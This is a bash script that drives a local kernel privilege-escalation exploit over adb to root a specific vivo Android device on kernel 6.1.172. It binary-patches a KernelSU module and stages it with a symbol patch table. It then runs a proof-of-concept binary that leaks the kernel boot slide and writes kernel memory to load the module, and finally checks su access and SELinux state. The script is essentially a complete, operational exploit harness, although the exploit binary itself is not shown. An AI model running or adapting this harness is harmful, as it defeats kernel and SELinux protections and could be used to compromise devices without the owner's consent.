#!/usr/bin/env bash
# One-shot attempt on PD2337 / 6.1.172 using reclaimed 6.1.172 assets.
# The poc is left to leak the current boot slide itself; we never inject the
# old 2026-11-21 slide. If leak fails, the poc exits before any kernel write.
export MSYS2_ARG_CONV_EXCL='/data;/proc;/sys;/system;/vendor'
SERIAL=${ADB_SERIAL:-10AE6E28Y10011K}
ROOT="D:/D-code/ganvivo/system/root"
TOOLS="$ROOT/xf3p-6.1.172-tools"
X="$ROOT/x fold3 pro root文件"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

adb() { command adb -s "$SERIAL" "$@"; }
say() { echo "[run_once] $*"; }
fail() { say "STOP: $*"; exit 1; }

# 0) read-only gates
[ "$(adb get-state 2>/dev/null)" = device ] || fail "device offline"
KERNEL=$(adb shell uname -r | tr -d '\r')
case "$KERNEL" in *6.1.172-android14-11-maybe-dirty*) ;; *) fail "wrong kernel $KERNEL";; esac
BOOT=$(adb shell 'cat /proc/sys/kernel/random/boot_id' | tr -d '\r')
say "kernel=$KERNEL boot=$BOOT"
adb shell 'grep -q "^kernelsu " /proc/modules' && fail "kernelsu already loaded"
adb shell 'ps -A -o ARGS 2>/dev/null | grep -q "[p]oc_tmp_root"' && fail "poc already running"
AVAIL=$(adb shell "grep MemAvailable /proc/meminfo | awk '{print \$2}'" | tr -d '\r')
[ "${AVAIL:-0}" -ge 2097152 ] || fail "MemAvailable low: $AVAIL"

POC_SHA=$(adb shell 'toybox sha256sum /data/local/tmp/poc_tmp_root' | awk '{print $1}' | tr -d '\r')
[ "$POC_SHA" = 369d2f78cf7d4692c165b0e888e3759d577de4ec831800e5705d997c727ea602 ] || fail "poc sha mismatch: $POC_SHA"
say "poc sha ok"

# 1) base KO: write vivo_module_filter only; leave the 226 symbols SHN_UNDEF
#    so poc_tmp_root's ksu_try() fills them with link + its own current slide.
python -I - "$X/ksu-final.ko" "$WORK/kernelsu.ko" <<'PY'
import sys
from pathlib import Path
d = bytearray(Path(sys.argv[1]).read_bytes())
old = b"scmversion=g0c0fdb960178\x00"
new = b"vivo_module_filter=auto\x00\x00"
i = d.find(old)
if i < 0:
    raise SystemExit("scmversion slot not found")
d[i:i + len(old)] = new
Path(sys.argv[2]).write_bytes(d)
PY
[ -s "$WORK/kernelsu.ko" ] || fail "base KO build failed"
BASE_SHA=$(sha256sum "$WORK/kernelsu.ko" | awk '{print $1}')
say "base KO built sha256=$BASE_SHA"

# 2) back up the two hard-coded paths, then stage our 6.1.172 assets
adb shell 'cp -f /data/local/tmp/kernelsu.ko /data/local/tmp/.kernelsu.ko.bak 2>/dev/null || true'
adb shell 'cp -f /data/local/tmp/ksu_patch.txt /data/local/tmp/.ksu_patch.txt.bak 2>/dev/null || true'
adb push "$WORK/kernelsu.ko" /data/local/tmp/kernelsu.ko >/dev/null || fail "push base KO failed"
adb push "$TOOLS/ksu_patch_6.1.172.txt" /data/local/tmp/ksu_patch.txt >/dev/null || fail "push patch table failed"
adb shell 'chmod 644 /data/local/tmp/kernelsu.ko /data/local/tmp/ksu_patch.txt'
D_KO=$(adb shell 'toybox sha256sum /data/local/tmp/kernelsu.ko' | awk '{print $1}' | tr -d '\r')
D_TB=$(adb shell 'toybox sha256sum /data/local/tmp/ksu_patch.txt' | awk '{print $1}' | tr -d '\r')
T_TB=$(sha256sum "$TOOLS/ksu_patch_6.1.172.txt" | awk '{print $1}')
[ "$D_KO" = "$BASE_SHA" ] || fail "device base KO sha mismatch"
[ "$D_TB" = "$T_TB" ] || fail "device patch table sha mismatch"
say "assets staged and verified (226-row 6.1.172 table)"

# 3) one shot: kiroot's exact recipe, poc leaks its own slide, timeout-bounded
adb shell 'cd /data/local/tmp; rm -f root.log; env -i PATH=/system/bin:/vendor/bin \
  POC_LOG=/data/local/tmp/root.log \
  POC_PRESSURE_MB=700 POC_GATE_MS=8000 POC_TP=1 POC_KILLHOOK=1 \
  POC_INSTALL_KSU=1 POC_SU_TEST=1 \
  timeout -k 5 300 setsid ./poc_tmp_root --seed /data/local/tmp >/dev/null 2>&1 &'
say "poc launched; watching up to 240s"

OK=0
i=0
while [ $i -lt 120 ]; do
  if adb shell 'grep -q "^kernelsu " /proc/modules' 2>/dev/null; then OK=1; break; fi
  if ! adb shell 'ps -A -o ARGS 2>/dev/null | grep -q "[p]oc_tmp_root"'; then
    sleep 2
    adb shell 'grep -q "^kernelsu " /proc/modules' 2>/dev/null && OK=1
    break
  fi
  sleep 2
  i=$((i + 1))
done

say "=== root.log tail ==="
adb shell 'tail -n 25 /data/local/tmp/root.log 2>/dev/null'
say "=== modules ==="
adb shell 'grep -iE "kernelsu|kiro" /proc/modules 2>/dev/null || echo none'
if [ "$OK" = 1 ]; then
  say "=== su check ==="
  adb shell 'su -c "id; cat /proc/self/attr/current; getenforce" 2>&1 | head -5'
  say "=== ksud debug info ==="
  adb shell 'su -c "/data/adb/ksud debug info" 2>&1 | head -8'
fi

# 4) restore staged disk files; keep /data/adb/ksu userland only when loaded
adb shell 'cp -f /data/local/tmp/.kernelsu.ko.bak /data/local/tmp/kernelsu.ko 2>/dev/null || true'
adb shell 'cp -f /data/local/tmp/.ksu_patch.txt.bak /data/local/tmp/ksu_patch.txt 2>/dev/null || true'
adb shell 'rm -f /data/local/tmp/.kernelsu.ko.bak /data/local/tmp/.ksu_patch.txt.bak \
  /data/local/tmp/kernelsu-patched.ko /data/local/tmp/root.log /data/local/tmp/cmd.txt \
  /data/local/tmp/seq_params.txt /data/local/tmp/cseq.log /data/local/tmp/child_log.txt 2>/dev/null || true'

if [ "$OK" = 1 ]; then
  say "RESULT=KERNELSU_LOADED"
else
  say "RESULT=NOT_LOADED (see root.log tail above)"
fi
